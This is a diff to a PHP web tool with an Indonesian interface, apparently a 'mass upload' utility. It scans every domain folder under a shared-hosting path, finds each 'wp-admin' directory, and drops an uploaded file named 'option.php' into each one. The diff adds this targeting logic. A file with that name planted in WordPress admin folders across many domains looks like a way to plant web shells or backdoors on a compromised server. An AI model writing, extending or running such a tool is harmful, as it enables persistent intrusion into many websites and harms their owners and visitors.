@@ -8,33 +8,50 @@ function getCurrentDirectory() {
     return getcwd();
 }
 
-// Fungsi untuk mendapatkan semua direktori dalam path tertentu
-function getAllDirectories($basePath, $maxDepth = 5) {
-    $directories = [];
+// Fungsi untuk mencari semua direktori target dalam path domains
+function findTargetDirectories($basePath, $targetDirName) {
+    $targetDirectories = [];
     
     if (!is_dir($basePath)) {
-        return $directories;
+        return $targetDirectories;
     }
     
-    $iterator = new RecursiveIteratorIterator(
-        new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
-        RecursiveIteratorIterator::SELF_FIRST
-    );
+    // Iterasi melalui semua domain di direktori domains
+    $domains = scandir($basePath);
     
-    foreach ($iterator as $path => $dir) {
-        if ($dir->isDir()) {
-            $depth = $iterator->getDepth();
-            if ($depth <= $maxDepth) {
-                $directories[] = [
-                    'path' => $path,
-                    'depth' => $depth,
-                    'name' => basename($path)
+    foreach ($domains as $domain) {
+        if ($domain === '.' || $domain === '..') continue;
+        
+        $domainPath = $basePath . '/' . $domain;
+        
+        if (is_dir($domainPath)) {
+            // Cari direktori target dalam setiap domain
+            $targetPath = $domainPath . '/' . $targetDirName;
+            
+            if (is_dir($targetPath)) {
+                $targetDirectories[] = [
+                    'domain' => $domain,
+                    'path' => $targetPath,
+                    'full_path' => $targetPath
                 ];
+            }
+            
+            // Juga cek dalam public_html jika ada
+            $publicHtmlPath = $domainPath . '/public_html';
+            if (is_dir($publicHtmlPath)) {
+                $targetPathInPublic = $publicHtmlPath . '/' . $targetDirName;
+                if (is_dir($targetPathInPublic)) {
+                    $targetDirectories[] = [
+                        'domain' => $domain,
+                        'path' => $targetPathInPublic,
+                        'full_path' => $targetPathInPublic
+                    ];
+                }
             }
         }
     }
     
-    return $directories;
+    return $targetDirectories;
 }
 
 // Fungsi untuk upload file ke multiple direktori dengan output real-time
@@ -43,8 +60,7 @@ function massUpload($sourceFile, $targetDirectories, $fileName) {
     $uploadCount = 0;
     
     foreach ($targetDirectories as $dirInfo) {
-        $dirPath = is_array($dirInfo) ? $dirInfo['path'] : $dirInfo;
-        $targetPath = $dirPath . '/' . $fileName;
+        $targetPath = $dirInfo['full_path'] . '/' . $fileName;
         
         // Buat backup file jika sudah ada
         if (file_exists($targetPath)) {
@@ -56,7 +72,7 @@ function massUpload($sourceFile, $targetDirectories, $fileName) {
             $result = [
                 'status' => 'success',
                 'path' => $targetPath,
-                'location' => $targetPath // Gunakan path langsung sebagai lokasi
+                'domain' => $dirInfo['domain']
             ];
             $results[] = $result;
             $uploadCount++;
@@ -72,6 +88,7 @@ function massUpload($sourceFile, $targetDirectories, $fileName) {
             $result = [
                 'status' => 'error',
                 'path' => $targetPath,
+                'domain' => $dirInfo['domain'],
                 'error' => 'Gagal mengupload file'
             ];
             $results[] = $result;
@@ -79,7 +96,7 @@ function massUpload($sourceFile, $targetDirectories, $fileName) {
             // Output real-time
             echo '<div class="url-item error">';
             echo '❌ <strong>GAGAL:</strong> ';
-            echo $result['path'] . ' - ';
+            echo $targetPath . ' - ';
             echo '<span style="color: #ff6666;">' . $result['error'] . '</span>';
             echo '</div>';
             flush();
@@ -87,7 +104,7 @@ function massUpload($sourceFile, $targetDirectories, $fileName) {
         }
         
         // Delay kecil untuk efek visual
-        usleep(100000); // 0.1 detik
+        usleep(50000); // 0.05 detik
     }
     
     return [
@@ -102,33 +119,20 @@ $uploadResult = null;
 $selectedPath = getCurrentDirectory();
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
-    $manualPath = $_POST['manual_path'] ?? $selectedPath;
-    $depth = intval($_POST['depth'] ?? 1);
+    $basePath = $_POST['base_path'] ?? $selectedPath;
+    $targetDirName = $_POST['target_dir'] ?? 'wp-admin';
     $fileName = $_POST['file_name'] ?? 'option.php';
     
-    // Validasi path manual
-    if (!empty($manualPath) && is_dir($manualPath)) {
-        $selectedPath = $manualPath;
+    // Validasi base path
+    if (!empty($basePath) && is_dir($basePath)) {
+        $selectedPath = $basePath;
     }
     
-    // Validasi depth
-    $depth = max(1, min(5, $depth));
-    
-    // Dapatkan semua direktori target
-    $targetDirs = getAllDirectories($selectedPath, $depth);
-    
-    // Filter hanya direktori dengan depth sesuai (subdirektori saja)
-    $filteredDirs = array_filter($targetDirs, function($dir) use ($depth) {
-        return $dir['depth'] == $depth;
-    });
-    
-    // Jika tidak ada di depth tertentu, ambil semua
-    if (empty($filteredDirs)) {
-        $filteredDirs = $targetDirs;
-    }
+    // Cari semua direktori target
+    $targetDirs = findTargetDirectories($selectedPath, $targetDirName);
     
     // Upload file
-    if (!empty($filteredDirs) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
+    if (!empty($targetDirs) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
         $tempFile = $_FILES['upload_file']['tmp_name'];
         
         // Mulai output real-time
@@ -136,16 +140,21 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
         echo '<h3>📊 Proses Upload Massal:</h3>';
         echo '<div class="stats">';
         echo '<div class="stat-box">';
-        echo '<div>Total Direktori</div>';
-        echo '<div style="font-size: 1.5rem;">' . count($filteredDirs) . '</div>';
+        echo '<div>Total Domain Ditemukan</div>';
+        echo '<div style="font-size: 1.5rem;">' . count($targetDirs) . '</div>';
         echo '</div>';
         echo '</div>';
         echo '<h4>📝 Lokasi File yang Diupload:</h4>';
         echo '<div class="url-list">';
         
-        $uploadResult = massUpload($tempFile, $filteredDirs, $fileName);
+        $uploadResult = massUpload($tempFile, $targetDirs, $fileName);
         
         echo '</div>';
+        echo '</div>';
+    } elseif (empty($targetDirs)) {
+        echo '<div class="output error">';
+        echo '<h3>❌ Tidak Ada Direktori Ditemukan</h3>';
+        echo '<p>Direktori "' . $targetDirName . '" tidak ditemukan dalam path: ' . $selectedPath . '</p>';
         echo '</div>';
     }
 }
@@ -219,7 +228,6 @@ $currentDir = getCurrentDirectory();
         }
         
         input[type="file"],
-        input[type="number"],
         input[type="text"],
         button {
             width: 100%;
@@ -257,6 +265,11 @@ $currentDir = getCurrentDirectory();
             margin-top: 20px;
             max-height: 600px;
             overflow-y: auto;
+        }
+        
+        .output.error {
+            border-color: #ff0000;
+            background: rgba(255, 0, 0, 0.1);
         }
         
         .success {
@@ -334,6 +347,14 @@ $currentDir = getCurrentDirectory();
             margin-top: 5px;
             word-break: break-all;
         }
+        
+        .example-box {
+            background: rgba(255, 255, 0, 0.1);
+            border: 1px solid #ffff00;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
@@ -350,10 +371,17 @@ $currentDir = getCurrentDirectory();
         <div class="upload-form">
             <form method="POST" enctype="multipart/form-data">
                 <div class="form-group">
-                    <label>📁 Path Direktori Awal:</label>
-                    <input type="text" name="manual_path" value="<?php echo $currentDir; ?>" 
-                           placeholder="Masukkan path lengkap direktori awal..." required>
-                    <div class="simple-info">Contoh: /home/u332834506/domains/</div>
+                    <label>📁 Path Base Domains:</label>
+                    <input type="text" name="base_path" value="/home/u958408751/domains/" 
+                           placeholder="Masukkan path base domains..." required>
+                    <div class="simple-info">Path utama yang berisi semua domain</div>
+                </div>
+                
+                <div class="form-group">
+                    <label>📂 Nama Direktori Target:</label>
+                    <input type="text" name="target_dir" value="wp-admin" 
+                           placeholder="Masukkan nama direktori target..." required>
+                    <div class="simple-info">Direktori yang akan dicari di setiap domain</div>
                 </div>
                 
                 <div class="form-group">
@@ -364,13 +392,15 @@ $currentDir = getCurrentDirectory();
                 <div class="form-group">
                     <label>📝 Nama File Target:</label>
                     <input type="text" name="file_name" value="option.php" required>
-                    <div class="simple-info">Nama file di setiap direktori</div>
+                    <div class="simple-info">Nama file yang akan diupload ke setiap direktori target</div>
                 </div>
                 
-                <div class="form-group">
-                    <label>📊 Kedalaman:</label>
-                    <input type="number" name="depth" min="1" max="5" value="1" required>
-                    <div class="simple-info">Level subdirektori (1-5)</div>
+                <div class="example-box">
+                    <strong>Contoh Penggunaan:</strong><br>
+                    Path Base: <code>/home/u958408751/domains/</code><br>
+                    Direktori Target: <code>wp-admin</code><br>
+                    Hasil: File akan diupload ke <code>/home/u958408751/domains/[domain]/wp-admin/option.php</code><br>
+                    untuk setiap domain yang memiliki direktori wp-admin
                 </div>
                 
                 <button type="submit">🚀 START MASS UPLOAD!</button>
@@ -381,7 +411,7 @@ $currentDir = getCurrentDirectory();
             <div class="info-box">
                 <div class="stats">
                     <div class="stat-box">
-                        <div>Total</div>
+                        <div>Total Domain</div>
                         <div style="font-size: 1.5rem;"><?php echo $uploadResult['total']; ?></div>
                     </div>
                     <div class="stat-box success">
@@ -398,16 +428,16 @@ $currentDir = getCurrentDirectory();
     </div>
 
     <script>
-        // Auto-focus pada input path
-        document.querySelector('input[name="manual_path"]').focus();
+        // Auto-focus pada input base path
+        document.querySelector('input[name="base_path"]').focus();
         
         // Konfirmasi sebelum upload
         document.querySelector('form').addEventListener('submit', function(e) {
-            const path = document.querySelector('input[name="manual_path"]').value;
-            const depth = document.querySelector('input[name="depth"]').value;
+            const basePath = document.querySelector('input[name="base_path"]').value;
+            const targetDir = document.querySelector('input[name="target_dir"]').value;
             const fileName = document.querySelector('input[name="file_name"]').value;
             
-            if (!confirm(`🚀 MULAI MASS UPLOAD?\n\nPath: ${path}\nKedalaman: ${depth}\nFile: ${fileName}`)) {
+            if (!confirm(`🚀 MULAI MASS UPLOAD?\n\nBase Path: ${basePath}\nDirektori Target: ${targetDir}\nFile: ${fileName}\n\nFile akan diupload ke semua domain yang memiliki direktori "${targetDir}"`)) {
                 e.preventDefault();
             }
         });
